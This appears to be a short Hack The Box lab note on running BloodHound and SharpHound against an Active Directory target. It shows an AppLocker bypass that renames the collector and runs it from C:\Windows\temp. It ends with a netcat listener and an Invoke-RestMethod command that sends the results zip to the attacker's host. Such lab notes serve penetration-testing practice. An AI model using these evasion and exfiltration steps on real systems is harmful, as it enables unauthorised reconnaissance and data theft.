# BloodHound 101

> Fun Fact: The German for Bloodhound is *Bluthund*

```bash
# In one TMUX pane
docker pull neo4j
docker run --name ne04j -d -p 7473:7473 -p 7474:7474 -p 7687:7687 -v $HOME/neo4j/data:/data -v $HOME/neo4j/logs:/logs -v $HOME/neo4j/import:/var/lib/neo4j/import -v $HOME/neo4j/plugins:/plugins --env 
NEO4J_AUTH=neo4j/test neo4j:latest

# In another TMUX pane
sudo ./BloodHound --no-sandbox 
```

Find a writeable directory on the box and use a `python` web server to get the files onto the target. (Use the SharpHound.exe)

Try to run it and get knocked back!

```bash
.\SharpHound.exe                                                                                     
Program 'SharpHound.exe' failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
+ .\SharpHound.exe                                                                                   
+ ~~~~~~~~~~~~~~~~.                                                                                  
At line:1 char:1                                                                                     
+ .\SharpHound.exe                                                                                                                                                                                         
+ ~~~~~~~~~~~~~~~~                                
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed  
```

This is an `AppLocker` issue. To get around this we need to run the binary from a "white listed" directory on the target. We can get a list of these directories from [this link](https://github.com/api0cradle/UltimateAppLockerByPassList)

> Just to be safe I also renamed the binary to `calc.exe` no idea if that is going to make a difference but it makes me feel better

```bash
mv SharpHound.exe calc.exe
copy calc.exe C:\Windows\temp\calc.exe
C:\Windows\temp\calc.exe
------------------------------------------------                                                     
Initializing SharpHound at 7:26 AM on 12/12/2020
------------------------------------------------                                                     
                                                  
Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
                                                  
[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL   
[+] Cache File not Found: 0 Objects in cache   
                                                                                                     
[+] Pre-populating Domain Controller SIDS      
Status: 0 objects finished (+0) -- Using 19 MB RAM                                                   
Status: 61 objects finished (+61 ì)/s -- Using 27 MB RAM
Enumeration finished in 00:00:00.4003317
Compressing data to .\20201212072610_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 7:26 AM on 12/12/2020! Happy Graphing!
```

> 2 hours later...

Finally got the ZIP file off the box and onto our machine:

```bash
# On our Kali box
nc -lvnp 1337 > bloodhound_results.zip
# On the target
Invoke-RestMethod -Uri http://10.10.14.3:1337/ -Method Post -InFile bloodhound.zip
```

Only way to tell if it's finished is to compare the size of the files on the Kali box and the host.
